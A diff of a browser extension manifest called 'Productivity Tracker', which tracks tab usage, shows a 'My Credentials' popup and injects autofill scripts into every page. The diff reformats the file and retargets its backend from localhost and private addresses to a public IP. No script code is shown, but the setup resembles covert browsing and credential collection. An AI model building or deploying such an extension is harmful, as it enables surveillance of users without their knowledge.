@@ -1,41 +1,39 @@
-{
-  "manifest_version": 3,
-  "name": "Productivity Tracker",
-  "version": "1.0",
-  "description": "Tracks active tab usage and sends data to backend.",
-  "permissions": [
-    "tabs",
-    "idle",
-    "storage",
-    "declarativeNetRequest",
-    "alarms",
-    "clipboardWrite"
-  ],
-  "host_permissions": [
-    "http://localhost:8565/*",
-    "http://127.0.0.1:8565/*",
-    "http://10.10.10.10:8565/*"
-  ],
-  "background": {
-    "service_worker": "background.js"
-  },
-  "action": {
-    "default_popup": "credentials.html",
-    "default_title": "My Credentials"
-  },
-  "content_scripts": [
-    {
-      "matches": [
-        "<all_urls>"
-      ],
-      "js": [
-        "config.js",
-        "autofill.js"
-      ],
-      "css": [
-        "autofill.css"
-      ],
-      "run_at": "document_idle"
-    }
-  ]
+﻿{
+    "manifest_version":  3,
+    "name":  "Productivity Tracker",
+    "version":  "1.0",
+    "description":  "Tracks active tab usage and sends data to backend.",
+    "permissions":  [
+                        "tabs",
+                        "idle",
+                        "storage",
+                        "declarativeNetRequest",
+                        "alarms",
+                        "clipboardWrite"
+                    ],
+    "host_permissions":  [
+                             "http://76.12.221.43:8565/*"
+                         ],
+    "background":  {
+                       "service_worker":  "background.js"
+                   },
+    "action":  {
+                   "default_popup":  "credentials.html",
+                   "default_title":  "My Credentials"
+               },
+    "content_scripts":  [
+                            {
+                                "matches":  [
+                                                "\u003call_urls\u003e"
+                                            ],
+                                "js":  [
+                                           "config.js",
+                                           "autofill.js"
+                                       ],
+                                "css":  [
+                                            "autofill.css"
+                                        ],
+                                "run_at":  "document_idle"
+                            }
+                        ]
 }
